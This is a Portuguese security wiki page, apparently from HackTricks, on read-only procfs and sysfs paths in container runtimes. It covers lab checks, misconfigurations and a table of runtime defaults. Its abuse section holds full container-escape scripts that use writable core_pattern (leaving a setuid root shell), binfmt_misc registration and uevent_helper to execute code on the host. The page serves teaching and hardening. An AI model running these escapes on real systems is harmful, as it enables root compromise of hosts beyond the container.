# Caminhos do Sistema Somente para Leitura

{{#include ../../../../banners/hacktricks-training.md}}

Os caminhos do sistema somente para leitura são uma proteção separada dos caminhos mascarados. Em vez de ocultar completamente um caminho, o runtime o expõe, mas o monta como somente leitura. Isso é comum em locais selecionados de procfs e sysfs, onde o acesso de leitura pode ser aceitável ou operacionalmente necessário, mas as gravações seriam perigosas demais.

O objetivo é simples: muitas interfaces do kernel se tornam muito mais perigosas quando podem ser gravadas. Uma montagem somente para leitura não remove todo o valor de reconnaissance, mas impede que uma workload comprometida modifique os arquivos voltados ao kernel subjacente por meio desse caminho.

## Operação

Os runtimes frequentemente marcam partes da visualização proc/sys como somente leitura. Dependendo do runtime e do host, isso pode incluir caminhos como:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

A lista real varia, mas o modelo é o mesmo: permitir visibilidade quando necessário e negar mutações por padrão.

## Lab

Inspecione a lista de caminhos somente para leitura declarada pelo Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Inspecione a visualização montada de proc/sys de dentro do contêiner:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Impacto na segurança

Os caminhos do sistema somente leitura reduzem uma grande classe de abusos que afetam o host. Mesmo quando um atacante pode inspecionar procfs ou sysfs, não poder gravar neles remove muitos caminhos diretos de modificação envolvendo ajustes do kernel, handlers de crash, auxiliares de carregamento de módulos ou outras interfaces de controle. A exposição não desaparece, mas a transição da divulgação de informações para a influência sobre o host se torna mais difícil.

## Configurações incorretas

Os principais erros são desmascarar ou remontar caminhos sensíveis como leitura e escrita, expor diretamente o conteúdo de proc/sys do host usando bind mounts com permissão de escrita ou usar modos privilegiados que efetivamente contornam os padrões de runtime mais seguros. No Kubernetes, `procMount: Unmasked` e workloads privilegiados costumam ocorrer junto com uma proteção mais fraca do proc. Outro erro operacional comum é presumir que, como o runtime geralmente monta esses caminhos como somente leitura, todos os workloads ainda herdam esse padrão.

## Abuso

Se a proteção for fraca, comece procurando entradas de proc/sys com permissão de escrita:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Quando houver entradas graváveis, os caminhos subsequentes de alto valor incluem:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
O que esses comandos podem revelar:

- Entradas graváveis em `/proc/sys` geralmente significam que o container pode modificar o comportamento do kernel do host, em vez de apenas inspecioná-lo.
- `core_pattern` é especialmente importante, pois um valor gravável voltado ao host pode ser transformado em um caminho de execução de código no host ao causar o crash de um processo depois de configurar um pipe handler.
- `modprobe` revela o helper usado pelo kernel em fluxos relacionados ao carregamento de módulos; é um alvo clássico de alto valor quando está gravável.
- `binfmt_misc` informa se é possível registrar interpretadores personalizados. Se o registro estiver gravável, isso pode se tornar uma primitiva de execução, em vez de apenas um information leak.
- `panic_on_oom` controla uma decisão do kernel que afeta todo o host e, portanto, pode transformar o esgotamento de recursos em uma negação de serviço no host.
- `uevent_helper` é um dos exemplos mais claros de um caminho de helper gravável no sysfs produzindo execução no contexto do host.

Descobertas interessantes incluem knobs do proc voltados ao host ou entradas do sysfs graváveis que normalmente deveriam ser somente leitura. Nesse ponto, o workload deixou uma visão restrita do container e passou a exercer uma influência significativa sobre o kernel.

### Exemplo Completo: `core_pattern` Host Escape

Se `/proc/sys/kernel/core_pattern` estiver gravável de dentro do container e apontar para a visão do kernel do host, ele poderá ser abusado para executar um payload após um crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Se o caminho realmente chegar ao kernel do host, o payload será executado no host e deixará um shell setuid para trás.

### Exemplo completo: registro do `binfmt_misc`

Se `/proc/sys/fs/binfmt_misc/register` for gravável, um registro de interpretador personalizado poderá permitir a execução de código quando o arquivo correspondente for executado:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Em um `binfmt_misc` gravável e voltado ao host, o resultado é a execução de código no caminho do interpretador acionado pelo kernel.

### Exemplo completo: `uevent_helper`

Se `/sys/kernel/uevent_helper` for gravável, o kernel poderá invocar um helper no caminho do host quando um evento correspondente for acionado:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
O motivo pelo qual isso é tão perigoso é que o caminho do helper é resolvido a partir da perspectiva do sistema de arquivos do host, em vez de um contexto seguro exclusivo do container.

## Verificações

Estas verificações determinam se a exposição de procfs/sysfs é somente leitura conforme esperado e se a carga de trabalho ainda pode modificar interfaces sensíveis do kernel.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
O que é interessante aqui:

- Um workload normal e hardened deve expor pouquíssimas entradas graváveis de proc/sys.
- Caminhos graváveis em `/proc/sys` geralmente são mais importantes do que o simples acesso de leitura.
- Se o runtime informar que um caminho é somente leitura, mas ele for gravável na prática, revise cuidadosamente a propagação de mounts, os bind mounts e as configurações de privilégios.

## Padrões de Runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Habilitado por padrão | O Docker define uma lista padrão de caminhos somente leitura para entradas sensíveis de proc | exposição de mounts proc/sys do host, `--privileged` |
| Podman | Habilitado por padrão | O Podman aplica caminhos padrão somente leitura, a menos que sejam explicitamente flexibilizados | `--security-opt unmask=ALL`, mounts amplos do host, `--privileged` |
| Kubernetes | Herda os padrões do runtime | Usa o modelo de caminhos somente leitura do runtime subjacente, a menos que seja enfraquecido pelas configurações do Pod ou por mounts do host | `procMount: Unmasked`, workloads privilegiados, mounts proc/sys graváveis do host |
| containerd / CRI-O sob Kubernetes | Padrão do runtime | Geralmente depende dos padrões de OCI/runtime | igual à linha do Kubernetes; alterações diretas na configuração do runtime podem enfraquecer o comportamento |

O ponto principal é que os caminhos do sistema somente leitura geralmente estão presentes como um padrão do runtime, mas são fáceis de enfraquecer com modos privilegiados ou bind mounts do host.
{{#include ../../../../banners/hacktricks-training.md}}
